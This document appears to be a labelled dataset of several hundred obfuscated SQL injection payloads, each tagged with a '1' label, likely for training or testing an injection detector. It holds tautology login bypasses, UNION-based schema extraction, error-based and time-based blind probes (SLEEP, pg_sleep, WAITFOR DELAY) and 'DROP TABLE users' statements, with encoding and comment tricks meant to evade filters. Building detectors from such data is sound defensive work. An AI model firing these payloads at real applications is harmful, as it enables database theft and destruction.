"%u0027%09%09%09AND%09%09%09extractvalue(1,concat(0x5c,version()))--", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3%09%09%09%09%09--%09%09%09%09%09random_noise--", 1
"' or '1'='1", 1
"' And 1=1 -- #EfzL4", 1
"' OR '1'<='1 # more_noise", 1
"admin'%09%09OR%09%09'1'/*!*/ LIKE '1", 1
"1'O/*!*/RIF(substring(database(),1,1)	='a',/*%0a*/", 1
"SLEEP(5),0)--", 1
"1' Or aSciI(SuBSTRiNg(DaTAbaSe(), 1, 1)) > 100 --", 1
"TEST%27%20Or%20%271%27%3d%271%27%20/*", 1
"%%33%42%20SEL/*!12345*/E%43T%2%30pg_sleep%285%29%3%42%20--", 1
"1'ANDsubstring(database(),/*%0d%0a*/1,1)=", 1
"'s'", 1
"--", 1
"'UNIONSELECT/*%0d%0a*/1,2,3--", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20--", 1
"' o%72 '1'='1 %23%20more_noise", 1
"test%27%20%20%20%20OR%20%20%20%20%271%27%2509%3D%2520%271%27%20%20%20%20--%20%20%20%20", 1
"%31AND%31	=%201%0d%0a", 1
"'/*!12345*/UNIONSELECT/*%0a*/1,2,3--", 1
"", 1
";SELECT/*%%30a%2a%2fpg_sleep(5);--", 1
"1%29%%32%39%20UNI%4fN%20SEL%45CT%201%2Cdat%61base%28%29%2C3/**/--/**/random_no%69se--", 1
"1)/**/UNION SELECT 1,database(),3--", 1
"1%u0027%U0020%u0020oR%U0020%U0020if(SubstRiNg(DaTabase(),%U0020%U00201,%U0020%U00201)%u0020=%U0020%U0020%U0027a%u0027,%u0020%U0020sLeep(5),%U0020%u00200)%u0020%U0020--", 1
"1)UNION", 1
"SELECT/*%0d%0a*/1,database(),3 -- random_noise--%0a", 1
"' aNd 1  IN (1)%20cOnVeRt(INt,@@veRsIon) AND 'a'='a'--", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29 AND 'a'='a'----orsa95b1e5m4ota", 1
"%27UNION/*%0d%0a*/SELECT1,2,3--", 1
";SELECT/*%0d%0a*/pg_sleep(5);/*%0a*/--", 1
"", 1
"1%27/**/AND/**/substring(database(),/**/1,/**/1)/**/%3D/**/%27s%27/**/----5r5ng0o02", 1
"admin%u0027%u0020O/*!*/R%u0020%u00271%u0027<=%u00271", 1
";%20SELECT%20pg_sleep(5);%20 # more_noise--#dpcad", 1
"tEst%27 XOR '1'='1' /%2A %4fR (1)", 1
"'%20AND%201  >=%20convert(int,@@version)----u4mag852uqyjye", 1
";/*!*/SELECT/**/pg_sleep(5);/**/--", 1
"%31'ORa%73cii(s%75bstring(%64atabase(),/*%0a*/1,%201))>100 OR (1)--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20--", 1
";/**/SEL/**/ECT/**/pg_sleep(5);/**/--", 1
"1%20%26%26%201%3C%3D1%20AND%20%27a%27%3D%27a%27", 1
";/**/DROP/**/TA%42%4cE/**/user%73;/**/----7m6hgthr7", 1
"admin%27%2F%2A%21%2A%2FOR%271%27%3D%271%250d%250a", 1
"%U0027%U0020aNd%U00201%3DCONVeRt(InT,@@vErsioN)--", 1
"%U0027%U0020O/**/r%u0020%u00271%U0027=%u00271%u0020/*!*/aNd%U00201=1", 1
"1'/**/aNd/**/SUBStrINg(databAsE(),/**/1,/**/1)/**/=/**/'s'/**/ -- random_noise--", 1
"' XOR 1=convert(int,@%40ver%73i%6fn)%2d-", 1
"1))/*!*/UNION SELECT 1,database(),3--", 1
"WAITFORDELAY'0:0:5'", 1
"/*!*/AND%0d%0a1=1--%0a", 1
"%27%20AND%201%3D1%20--%20--vnot3kbipg4", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#qr0p5v8a", 1
"%27%20UNION%%320SE%4cECT%20null%%32C%20n%75ll%2C%%320null%20--%20", 1
"1%2527%2520o%2F%2A%2A%2Fr%2520Ascii%28SubStrINg%28DATAbaSe%28%29%2C%25201%2C%25201%29%29%2520%253E%2520100%2520--", 1
"'/*!12345*/AND extractvalue(1,concat(0x5c,version()))--", 1
"%27aND%250d%250AEXTrACtVaLue%281%2ccoNcat%280x5C%2CVERsION%28%29%29%29--%2f%2a%250A%2a%2f", 1
"%25u0027%25u0020anD%25U00201%3dCONVeRT%28iNT%2c%40%40versIoN%29%25U0020Or%25U0020%281%29--", 1
"1%27%%320O%52%20ascii%28substring(dat%61ba%73e%28),%201,%201))%20%3E%20100%20--", 1
"1'/*!12345*/UNION SELECT table_name, null, null FROM information_schema.tables --", 1
"1'/**/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  /*!*/AND 1=1--", 1
"admin'/**/OR/**/'1'<='1/**//*!*/AND/**/1=1", 1
"'/**/OR%201=1/**/--/**/#9j%6fvf%349ed026", 1
"%27OR", 1
"EXISTS(SELECT1/*%0d%0a*/FROM/*%0a*/users)--", 1
"'/**/or/**/ExISTs(seLect/**/1/**/From/**/useRs)--#XFqWgj", 1
";%20SELEcT%20pg_SLEEp(5);%20--", 1
"1' || ascii(substring(database(), 1, 1)) > 100 ----euxes8w5r72ey", 1
"ADMin' or '1'='1", 1
"'/**/UNION/**/%53ELEC%54/**/1,2%2c3--", 1
"1%u0027/**/UN/**/ION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--", 1
"1' Or if(subSTRing(daTAbaSe(), 1, 1)='a', sLeEp(5), 0) --", 1
"'/**/And/**/1IN (1)1/**/--/**/", 1
"1%27/**/UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20%20OR%20(1)--", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/#9o2ncg56u", 1
"WAITfor%20%20%20dElAy%20%20%20%270:0:5%27 -- random_noise--", 1
"1%27A%2F%2A%2112345%2A%2FND%0Asubstring%28database%28%29%2C%250a1%2C1%29%3D%250a%27s%27--", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020<=%u0020%u0027s%u0027%u0020--", 1
"1)UN/*!*/IONSELECT", 1
"1,database(),3----hjgx3m0rfk3%0a", 1
"%u0027/**/OR%20EXISTS(SELECT%u00201%20FROM%20us%65rs) OR 'b'='b'--", 1
"%3B%2F%2A%2112345%2A%2FSELECT%20pg_sleep%285%29%3B%20%20%23%20more_noise--", 1
"'O/**/R'1'='1/*%0d%0a*/", 1
"WAITFOR/*!12345*/DELAY        '0:0:5'----v2np200bq6g", 1
"WAItFO/**/R					DElaY					'0:0:5'----vc39o802ZDpd", 1
"' && 1IN (1)1 --", 1
"1%29/**/UN%49ON%20SELECT 1%2cdatabase(),3--", 1
"1' UNIOn seLecT tabLE_namE, null, nUll FrOm INFORMAtIOn_Schema.tAblES --", 1
"WaitFOrdELay%270%3A0%3A5%27--%250A", 1
"1/*%2A/%41Nd/**/1=1", 1
"1)UnIonSELect1,DaTaBASE(),3--", 1
"", 1
"test'OR%0d%0a'1'='1'/*%0a", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29--#ldnc7mpux4ija", 1
"admin' XOR '1'>='1", 1
"1%27/*!*/AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20%20#%20more_noise--", 1
"1%27%20UN/*!*/ION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--", 1
"1' And substrINg(DAtaBAsE(), 1, 1) = 'S' --", 1
"%u0027AND%0d%0aextractvalue(1,concat(0x5c,version()))--/*%0d%0a*/", 1
"TEst%27%20oR%20%271%27%3D%271%27%20--%20#b985dkv91nf", 1
"'/*!*/AND extractvalue(1,concat(0x5c,version()))--#rhp7ktubedshbqv", 1
"%27%20OR%201%3D1%20 OR (1)--%20", 1
"%31' AN%44 substring(d%61t%61b%61se(), 1, 1) <= 's'  # more_noise--", 1
"%u0027%u0020UNI%4f%4e%u0020SELECT%u0020null,%u0020%6eull,%u0020nu%6cl%u0020--%u0020", 1
"%27%20or%20eXiStS%28SELEct%201%20fRoM%20userS%29--", 1
"1%u0027/**/A/**/ND/**/substring(database(),/**/1,/**/1)/**/=/**/%u0027s%u0027/**/--", 1
"1%27%09%09%09%09%09OR%09%09%09%09%09IF%28substring%28database%28%29%2C%09%09%09%09%091%2C%09%09%09%09%091%29%20%3D%2520%27a%27%2C%09%09%09%09%09SLEEP%285%29%2C%09%09%09%09%090%29%09%09%09%09%09--%23iff18", 1
"WaiTfOR/**/dELAy/**/'0:0:5' Or (1)--", 1
"%u0027/*%2a/UNI%4fN/**/SELECT/**/1,2,%33-%2d", 1
"waitfor DeLay '0:0:5'----0QZN8", 1
"1'/*%2A/%4f%52/**/AsCiI(%73%75BsTRinG(d%61TABASE()%2C%2f**/1,/**/1))/**/>/**/100/**/--", 1
";%20Sel/*!12345%2a/ect%20pg_SL%65EP%285%29;%20--", 1
"%27%20%20%20%20%20%20%20%20UNION%20%20%20%20%20%20%20%20SELECT%20%20%20%20%20%20%20%201,2,3--", 1
"admi%6e%27%20OR%20%%3271%27%3D%%3271--y7p1bnto6x1h", 1
"admin%u0027%u0020O/**/R%u0020%u00271%u0027=%u00271", 1
"1%25u0027%25u0020AND%25u0020substring%28database%28%29%2C%25u00201%2C%25u00201%29%25u0020%3D%25u0020%25u0027s%25u0027%25u0020--", 1
"test%27%20%7C%7C%20%271%27%3D%271%27%20--%20", 1
"WAITFO/**/R%09DELAY%09'0:0:5' -- random_noise--", 1
"%27%2F%2A%2A%2FUN/**/ION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2F--%2F%2A%2A%2F%23yvqsheogkv1o", 1
"%27%20oR%20EXisTS%28SelECt%201%20FRoM%20Users%29 OR 'B'IN (1)'B'--", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3%20#%20more_noise--", 1
"1%u0027ORascii(substring(database(),1,/*%0a*/1))>100%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--%0d%0a", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**/--", 1
"%27%20aNd%201%253D1%20%252d-%20", 1
"admin%27/*!*/OR%20%271%27%3D%271", 1
";%20DROP%2%30T%41BLE%20users%3b%20--", 1
"%27%20%4fR%20EXIST%53(SE%4cECT%201%20%46R%4fM%20users%29--#wal8uwjqjdij3cp", 1
"1%u0027%u0020UNIon%u0020sElEct%u0020tAbLe_Name,%u0020nULL,%u0020nUlL%u0020fRom%u0020InFormAtiOn_SchEMA.TabLes%u0020--", 1
"1%u0027/**/AND/**/substring(database(),/**/1,/**/1)/**/=/**/%u0027s%u0027/**/--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  -- random_noise--#2epl4ilfp6r", 1
";%20DROP%20TABLE%20users;%20 -- random_noise--", 1
"' OR EXISTS(SELECT 1 FROM users) OR 'b'='b'--", 1
"1)/**/UNION/**/SEL%45CT/**/1,dat%61base(%29,%33/*!*/OR (1)--", 1
"1%27%20UnION%20SElECt%20tablE_NamE%2c%20nUll%2c%20NULl%20fRoM%20inFoRmaTiON_sCHeMa.TaBLEs%20%20--%20rAnDOm_nOIsE--", 1
";/*!*/SElect pg_SLEep(5);  /*!*/AND 1=1----C94Ql86zu9TBi", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--#0cghl", 1
"TeST%u0027%u0020Or%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020--d8zFs7jtB", 1
"%3B%20Select%20pg_SLEEp%285%29%3B%20--", 1
"adm%69n' %4fR '1'='1--bprno%67uw", 1
"admi%6e'/*!12345*/OR '%31'='1#cpr292j9ltd", 1
"%u0027%20%2%30OR%2%30%201/**/=/*%2a%2f1%20%20--%20%20", 1
"admin%27%20O/*!*/R%20%271%27%3D%271", 1
"1)/*!12345*/UNION SELECT 1,database(),3--", 1
"; SELECT pg_sleep(5); ----q0rw1", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/#tmil2y1pnxefq", 1
"1))	UNION	SELECT	1,database(),3----zesi0ij7pwia", 1
"1' XOR substring(database(), 1, 1) = 's' --", 1
"%27%20And%201%3D1%20--%20", 1
";%20DROP%20T%41BLE%20users;%20%2d-", 1
"admin' OR '1'	=  '1", 1
"1%27%20%7C%7C%20%281%3D1%29ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"%u0027%u0020aND%u00201=C%6FNVeRt(Int%2C@@V%65R%73ion)--", 1
"1%u0027/*!*/OR/**/IF(substring(database(),/**/1,/**/1)=%u0027a%u0027,/**/SLEEP(5),/**/0)/**/--", 1
"' XOR EXISTS(SE%4c%45CT 1 F%52OM user%73)----l4b%67p9o6ok", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--%237cr9l", 1
"' AND 1=convert(int,@@version) # more_noise--", 1
"test' || '1'='1' /*", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--", 1
"%u0027%u0020AND%u00201LIKE1%u0020--%u0020", 1
"1'UNIONSELECTtable_name,%0d%0anull,nullFROMinformation_schema.tables#more_noise--", 1
";%20SEL/*!*/ECT%20pg_sleep(5);%20--", 1
"1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F--", 1
"AdMiN'/**/oR/**/'1'='1 AND 'a'='a'", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20----yphdc", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**//**/--/**/random_noise----h1xx50", 1
"1))/*!12345*/U%4eIONSEL%45CT", 1
"1,data%62a%73e(),3--%0d%0a", 1
"%27%2F%2A%2112345%2A%2FUNION%20SELECT%20null%2C%20null%2C%20null%20--%20%23dk01tffc1u4wi6i", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 ----ot5lv", 1
"TesT' OR '1'='1' /*", 1
"1%27%20union%20selEct%20tabLe_NAmE,%20null,%20nULl%20frOM%20infOrmaTIoN_SchEma.TAbleS%20--", 1
"%27%20And%201%3d1%20--%20", 1
"test'/*!*/OR'1'<='1'/*%0a*/--%0a", 1
"", 1
"'/**/uNION/**/SELeCT/**/nUlL,/**/NulL,/**/NulL/**/--/**/", 1
"test'/*!12345*/OR '1'IN (1)'1' /*", 1
"WAITFOR/*!12345*/     DELAY      '0:0:5'--#v1ptbu2y6bv86", 1
"WAITFOR%2F%2A%2A%%32F%44ELAY%2F%2A%2A%2F%270%3A%30%3A5%27---%2d%65042gb7%70a63b", 1
"1%u0027%u0020UN/*!12345*/ION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--", 1
"1%u0027%u0020union%U0020seLecT%u0020TaBLe_NaME,%u0020NUll,%U0020nULl%U0020FrOm%U0020INFORMaTIon_scHemA.tAbLEs%u0020--", 1
"%3bSELECT%0d%0%61pg_sle%65p(5);--%0d%0a", 1
"%u0027/**/UNION%u0020%53EL%45CT%u0020%31,2,3--", 1
"WAITFORDELAY%250a%270%3A0%3A5%27--%2F%2A%250a%2A%2F", 1
"1AND/*%0a*/1	%3D	1%0a", 1
"'/**/Union/**/SelECt/**/1,2,3--", 1
"1%u0027%u0020%41N%44%u00%320s%75bstring(databa%73%65(),%u00201,%u0020%31)%u002%30=%u0020%u0027s%u0027%u0%3020----ixb035l%61v2", 1
"'A/*!12345*/ND%0a1=convert(int,@@version)AND%0d%0a'a'='a'--/*%0d%0a*/", 1
";DROPTABLE", 1
"users;--", 1
"#w63gf", 1
"test%27%20OR%20%271%27%3D%271%27%20%20AND%20%27a%27%3D%27a%27--%20", 1
"' AND ex%74ractvalue(1,conca%74(0x5c,%76%65rsio%6e()))--", 1
";%u0020SEL/*!*/ECT%u0020pg_sleep(5);%u0020--", 1
"%u0027UN/**/IONSELECTnull,null,null/*%0a*/--", 1
"admin'/**/OR '1'='1", 1
"1 AND 1=1#q9wt0uhhrbkl", 1
";SELECT", 1
"pg_sleep(5);--/*%0a*/", 1
"1%27ORIF%28substring%28database%28%29%2C1%2C1%29%3C%3D%27a%27%2CSLEEP%285%29%2C%2F%2A%250a%2A%2F0%29--%2F%2A%250d%250a%2A%2F", 1
"'/**/U%4eION/**/SEL%45CT/**/null,/**/null,/**/nul%6c/**//**//*!*/A%4eD/**/1%3d1--/**/", 1
"'/*!12345*/OR 1=1  OR 'b'='b'-- #yd1cj2", 1
"%u0027%u0020aNd%u00201=1%u0020--%u0020#4ztxr", 1
"'%20%20OR%20%201>%09=	1%20%20--%20%20--mmam1xs0gpxscyx", 1
"%u0027%u0020OR%u0020%u00271%u0027%3D%u00271", 1
"1%27				OR				AsCII(suBS%74rI%6Eg(DAtabaSe(),				%31,				1))				%3E				100%20%2D-", 1
"admin'OR'1'='1", 1
"", 1
"%27%20A/*!*/ND%201%3Dconvert%28int%2C%40%40version%29--", 1
"1)/**/unIOn/**/SELEct/**/1,dATabAse(),3--", 1
"test%27%20OR%20%271%27%3D%271%27%20/*--oz2wi3", 1
"1'ORIF(substring(database(),1,1)='a',SLEEP(5),", 1
"0)/*%0a*/--/*%0a*/", 1
"' OR EXISTS(SELECT 1 FROM users)--#9mrkl0z", 1
"%31)					UnIOn					sELE%63t					1,dAtabaSe()%2c3-%2d", 1
"test%2527%09%09%09%09%09XOR%09%09%09%09%09%25271%2527%2520%253D%2509%25271%2527%09%09%09%09%09%2F%2A", 1
"1%27%20%20UNION%20%20SELECT%20%20table_name%2C%20%20null%2C%20%20null%20%20FROM%20%20information_schema.tables%20%20--#tny449o", 1
"' or eXiSTs(sEleCt 1 from userS)--", 1
"test%u0027/*!12345*/OR%u0020%u00271%u0027=%u00271%u0027%u0020/*#ieu7kq7e2", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--#dfzm390wc", 1
"1'/**/&&/**/substring(database(),/**/1,/**/1)/**//*!*/ =  /**/'s'/**/--", 1
"1)) UNION SELECT 1,database(),3----svzud87vn1ef", 1
"1%27%20A/**/ND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--#7rhraui0", 1
"%27%20UN%49ON%20SELECT%201,2%2c3 OR 'b'='b'--", 1
"%2527%2520UNION%2520SELECT%25201%2C2%2C3--", 1
"test'OR'1'='1'%0a--/*%0a*/", 1
"WAitFO/*!12345*/R%20dELAy%20%270%3a0%3A5%27--", 1
"1' AND substring(database(), 1, 1) <= 's' --", 1
"%u0027%u0020%u0020%u0020%u0020UNION%u0020%u0020%u0020%u0020SELECT%u0020%u0020%u0020%u00201,2,3--", 1
"'OR1%20=	1%0d%0a--%0d%0a", 1
"test%27OR%271%27%3D%271%27%0d%0a/*", 1
"", 1
"test'/%2a*/OR%2f**/'1'='1%27/**/--%2f**/", 1
"1'%2f**/OR ascii(substr%69ng(d%61tabase(), 1,%20%31)) > 100 --#v%6fxt29", 1
"1%27%20%20%20%20and%20%20%20%20SubsTrIng%28DATaBaSe%28%29%2C%20%20%20%201%2C%20%20%20%201%29%20%20%20%20%20%3D%2520%20%20%20%20%27s%27%20%20%20%20--", 1
"test%u0027/**/OR/**/%u00271%u0027=%u00271%u0027/**/--/**/--6q9skc1sb", 1
"%u0027%u0020OR%u00201>=1%u0020--%u0020--f1b3c1", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3--#j2mbk", 1
"WAITFOR%20DELAY%20%270:0:5%27%20OR%20%27b%27%3D%27b%27----dv206fg20rij6", 1
";/*!*/SELECT pg_sleep(5);  OR (1)--", 1
"%31%27%20%26%%326%20substring%28%64atabase%%328%2%39%2C%201%2C%2%301%29%20%3D%20%27s%2%37%20--", 1
"1'%09%09%09%09%09OR%09%09%09%09%09ascii(substring(database(),%09%09%09%09%091,%09%09%09%09%091))%09%09%09%09%09>%09%09%09%09%09100%09%09%09%09%09%09%09%09%09%09AND%09%09%09%09%09'a'%09=%20'a'--", 1
"WAITFO/**/R%20DELAY%20%270%3A0%3A5%27--", 1
"'/**/AND extractvalue(1,concat(0x5c,version()))----h7dm445o0", 1
"' UNION SELECT 1,2,3--#ac5u2vwf", 1
"%27%%320OR%%3201%3D1%20--%20--6m%37%72ycs730", 1
"1%25u0027%25u0020AND%25u0020substring%28database%28%29%2C%25u00201%2C%25u00201%29%25u0020%3D%25u0020%25u0027s%25u0027%25u0020 /*!*/AND 1=1--%232ji82", 1
"test%27%20||%20(1%3D1)%271%27IN%20(1)%271%27%20/*", 1
"%27%20OR%201%3D1%20--%20#ad8059xg9dy", 1
"1'oRaScII(SubSTRiNg(DaTABAse(),1,1))>100--%0a", 1
"%27%20OR%20%271%27%3d%271", 1
"'%20O%52 1<=1 -- #c0r%35xaiy3t", 1
"' AND extractvalue(1,concat(0x5c,version())) OR 'b'='b'--", 1
"test'/**/OR/**/'1'%20= '1'/**/--/**/", 1
"1%29%29%20UNIoN%20seLecT%201%2CdATaBaSe%28%29%2C3--", 1
"%27%20OR%201%3D1%20--%20#smdes6eyq69", 1
"%27%20anD%201%3dCONVERt(iNt,@@VERsIOn)--", 1
"%27/*!*/OR%20%20%20%271%27%09%3D%20%271%20%20%20--%20%20%20random_noise", 1
";%64roP%0d%0aTAb%4cE%0d%0auSErS;%20--/*%0a*/", 1
"%27XOR%2F%2A%250a%2A%2F1%3Dconvert%28int%2C%40%40version%29--%250a", 1
"1%u0027%u0020or%u0020ASCiI(subStRiNG(dAtabAse(),%u00201,%u00201))%U0020>%U0020100%u0020 -- ranDOm_NoIsE--", 1
"'/*!*/aNd 1=1 --", 1
"1%27%2520%2520%2520%2520AND%2520%2520%2520%2520substring%28database%28%29%2C%2520%2520%2520%25201%2C%2520%2520%2520%25201%29%2520%2520%2520%2520%2520%3D%2520%2520%2520%2520%2520%27s%27%2520%2520%2520%2520%2520%2520%2520%2520--%2520%2520%2520%2520random_noise--", 1
"admin%27			XO%52%09		%27%31%27%20%3D%20%271", 1
"Test%27%09%09%09oR%09%09%09%271%27%20%3D%2509%271%27%09%09%09--%09%09%09", 1
"' XOR 1=convert(int,@@version) -- random_noise--", 1
"%74est%27%20%4fR%20%271%27%3D%271%27%2%30/*%u0020OR%u0020(1)", 1
";%20SELECT/*!12345*/%70g_sle%65p(5);%u0020--", 1
";					DROP					TABLE					users;					--", 1
"admin%2%37%20%4fR%20%271%27%3D%2%371", 1
"' AND 1=convert(int,@@version)----2trc1937jtlampo", 1
"'/*!12345*/uNIoN%20sELEcT n%75L%6C, nUll, nULl %2D-", 1
";%20SELECT%20pg_sleep(5);%20 AND 'a'='a'--", 1
";/*!12345*/droptABlEuserS;AND", 1
"'a'='a'--", 1
"1%27%20anD%20sUBsTRiNg%28dATaBASe%28%29%2C%201%2C%201%29%20%3D%20%27S%27%20 OR (1)----tfqioj", 1
"admin%27%20%20%20O/*!*/R%20%20%20%271%27%20%3D%09%271--0ftg6ld46rout", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/*#vmq2q", 1
"test'/*!*/OR '1'='1' /*", 1
"'/*!*/OR/**/1<=1/**/--/**/", 1
"1%u0027%%750020UNION%u0020SELECT%%750020table%5fname,%u0020%6eull%2c%u%30020null%u0%3020FRO%4d%u0020in%66ormation_schema.table%73%%750020--", 1
"admin%27    OR    '1'%3d'1--2psgy0%66b", 1
"WAITFOR%250d%250aDELAY%250a%270%3A0%3A5%27--", 1
"'/**/AND/**/1=1/**/%20%23/**/more%5fnoise--/**/--da9fpxq402%35", 1
"tESt'/**/||/**/'1'='1'/**//**/oR/**/(1)--/**/", 1
"AdMin'or", 1
"'1'='1/*%0d%0A*/", 1
"%27%20OR%2%30%271%27%%33D%271", 1
"1))%09%09%09%09UNION%09%09%09%09SELECT%09%09%09%091,database(),3--", 1
"' AND 1IN (1)cONVERT(InT,@@VErSiOn)--", 1
"1 AND 1IN (1)1", 1
"'/*!12345*/OR 1=1 --", 1
"1%20%41N%44%201%3D1", 1
"' AND extractvalue(1,concat(0x5c,version())) # more_noise--", 1
";/**/SElect/**/PG_slEeP(5);/**/--", 1
"'OREXISTS(SELECT1%0d%0aFROM/*%0d%0a*/users)--%0d%0a", 1
"test'OR'1'='1'/*%0a*//*%0a*/AND'a'='a'--", 1
"%3B%20DROP%20TABLE%20users%3B%20%20%2F%2A%21%2A%2FAND%201%3D1--", 1
";SELECTpg_sleep(5);%0d%0aOR%0a'b'='b'--", 1
"admin%27OR/*%0a*/%271%27%3D%271/*%0d%0a*/", 1
"1%u0027/**/O/**/R/**/IF(substring(database(),/**/1,/**/1)=%u0027a%u0027,/**/SLEEP(5),/**/0)/**/--#75b00qasq9t3", 1
"1)) uNIOn Select 1,DAtabAse(),3 ANd 'A'>='A'--", 1
"1/*!*/aN%44/**/1=%31", 1
"1%29UNION%2F%2A%250a%2A%2FSELECT1%2Cdatabase%28%29%2C3--", 1
"1'/**/OR ascii(substring(database(), 1, 1)) > 100 --", 1
"' || '1' <= '1", 1
"admin%27%20||%20(1%3D1)%271%27%3E%3D%271%20OR%20%27b%27%3D%27b%27", 1
"WAITFOR%2F%2A%21%2A%2FDELAY%09%270%3A0%3A5%27--", 1
"'/*!*/UNIONSELECT%0anull,/*%0d%0a*/null,null--%0d%0a", 1
"1%29%20UN/**/ION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"1'%09%09%09%09%09OR%09%09%09%09%09ascii(substring(database(),%09%09%09%09%091,%09%09%09%09%091))%09%09%09%09%09>%09%09%09%09%09100%09%09%09%09%09--", 1
"Test' oR '1'='1' /*", 1
"1%27					OR					IF(substring(database(),					1,					1)%20%20%3D	%27a%27,					SLEEP(5),					0)					--", 1
"; Drop tABLe usErs; --", 1
";dROp/*%0d%0a*/tAbLEUsERs;--/*%0a*/", 1
"'/**/And 1=cONvERT(INT,@@VErsIoN)--#95wjwj7age01o3", 1
"; SELECT pg_sleep(5);  # more_noise--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A--99tmo", 1
"'/**/OR/**/'1'<='1", 1
"'/*!12345*/AND EXtracTVaLUE(1,conCaT(0x5C,veRsIoN()))--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----aprxzssr", 1
"%u0027%u0020UN/*!12345*/ION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020", 1
"1/**/AND/**/1>=1--7tshy", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20----a4bzdcvhd6amo", 1
"1'%09%09%09O/**/R%09%09%09ascii(substring(database(),%09%09%091,%09%09%091))%09%09%09>%09%09%09100%09%09%09--", 1
"'/**/AND/**/1=", 1
"convert(int,@@version)--#mvhhhokgf9a", 1
"1%27%20O%52%20as%63ii%28sub%73tring%28dat%61base%2%38%29%2C%201%2C%201%29%29%20%3E%%320%3100%20--", 1
"' UniON SElECT Null, nULL, nuLL --", 1
"'/**/AnD/**/1=1/**/ AND 'a'='a'--/**/", 1
"1))unIOn/*%0D%0a*/se%4cE%43T1,D%61tABas%65(),3--%0d%0a", 1
"'UNION%%30aSELECT%0a1,2,3%2d-%0a", 1
"tes%74'/**/||%2f**/'1%27='1'/**%2f--/**/", 1
"1%27%09%09%09%09OR%09%09%09%09IF(substring(database(),%09%09%09%091,%09%09%09%091)%09%3D%20%27a%27,%09%09%09%09SLEEP(5),%09%09%09%090)%09%09%09%09--", 1
"1'/*!*/AND substring(database(), 1, 1) = 's' --", 1
"%27%20%20%20%20%20%20%20%20%20%20UN%49ON%20%20%20%20%20%20%20%20%20%20SE%4cECT%20%20%20%20%20%20%20%20%20%201,2,3-%2d", 1
"1' XOR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----ln0smu", 1
"1%27%2520%2520%2520%2520OR%2520%2520%2520%2520ascii%28substring%28database%28%29%2C%2520%2520%2520%25201%2C%2520%2520%2520%25201%29%29%2520%2520%2520%2520%3E%2520%2520%2520%2520100%2520%2520%2520%2520--", 1
"'AND", 1
"extractvalue(1,concat(0x5c,version()))--/*%0a*/", 1
"1%%320AN%44%201%3D1", 1
"1%25u0027%25u0020UNION%25u0020SELECT%25u0020table_name%2C%25u0020null%2C%25u0020null%25u0020FROM%25u0020information_schema.tables%25u0020----u9gp4", 1
"1)/**/UN/*!*/ION/**/SELECT/**/1,database(),3--", 1
";DROPTABLE", 1
"users;%0a--%0d%0a", 1
"test%27OR%271%27%3D%271%27--%0d%0a#oi69ohp%0a", 1
"%u0027%u0020AND%u00201=1%u0020--%u0020--skip58wst0ym", 1
"admin' || '1'<='1 OR (1)", 1
"%27%20anD%201%3dConvert%28INt%2C%40%40VerSiON%29--", 1
"'%09%09%09%09%09OR%09%09%09%09%091%09LIKE%201%09%09%09%09%09--%09%09%09%09%09", 1
"1))UNION/*%0d%0a*/SELECT%0d%0a1,database(),3--%0d%0a", 1
"1/**/AND%20%201%20=  1", 1
"admin' OR '1'='1--qr5o1spde51bcm", 1
"test'%20OR%20'1'='1'/*", 1
"", 1
"'/**/A/**/ND/**/extractvalue(1,concat(0x5c,version()))--", 1
"1)UNION/*%0d%0a*/SELECT1,database(),3--#1z6saku85d5/*%0a*/", 1
"test'%09%09OR%09%09'1'LIKE'1'%09%09/*--xgs4rxvh0trpi82", 1
"' || (1=1)EXISTS(SELECT 1 FROM users)--", 1
"%27 %55NION S%45LECT null, nul%6c, null --", 1
"%27%20UN/*!*/ION%20SELECT%201%2C2%2C3--", 1
"%31)) UNioN %53eLECt 1,dATABa%73e(),%33--", 1
